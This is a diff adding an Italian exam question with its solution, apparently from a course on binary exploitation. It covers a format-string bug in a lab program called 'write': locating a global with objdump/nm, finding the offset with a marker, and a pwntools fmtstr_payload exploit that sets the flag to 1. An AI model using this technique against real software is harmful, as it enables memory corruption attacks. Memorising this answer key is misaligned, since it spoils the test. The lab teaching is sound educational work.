@@ -1,0 +1,17 @@
+\question[7]
+In \lstinline|write.c| (es.\ 02) c'è una globale \lstinline|int flag = 0| mai riassegnata; \lstinline|main| stampa il messaggio di successo solo se \lstinline|flag != 0|. L'unica \lstinline|printf(buf)| vulnerabile è in \lstinline|vulnerable()|.
+(a) Perché l'indirizzo di \lstinline|flag| è stabile e noto a priori? (b) Con quali comandi lo trovi e come determini l'offset? (c) Scrivi l'exploit pwntools che rende \lstinline|flag = 1|.
+\begin{solution}
+(a) Il binario è compilato \lstinline|-no-pie|: indirizzi assoluti e stabili. \lstinline|flag| è una globale in \lstinline|.bss|, quindi ha un indirizzo noto a priori; non serve un leak preliminare (con PIE+ASLR invece servirebbe).\\
+(b) Indirizzo: \lstinline!objdump -t ./write | grep ' flag$'! (oppure \lstinline!nm ./write | grep ' flag$'!), es.\ \lstinline|0804c030|. Offset: metodo del marcatore, \lstinline|echo -n 'AAAA.%7$x'| finché si rivede \lstinline|41414141| (offset $=7$).\\
+(c) \lstinline|fmtstr_payload| costruisce il payload \lstinline|%n| corretto (arch-aware):
+\begin{lstlisting}[style=py]
+from pwn import *
+e = ELF('/home/student/bin/i386/write')
+offset = 7                       # dal marcatore
+p = fmtstr_payload(offset, {e.symbols['flag']: 1})
+io = process(e.path); io.sendline(p)
+print(io.recvall().decode())     # -> Congratulazioni! flag = 1...
+\end{lstlisting}
+\lstinline|ELF()| legge l'indirizzo di \lstinline|flag| dal binario; \lstinline|{flag: 1}| chiede di scrivervi 1. Stesso script per x64/arm64.
+\end{solution}
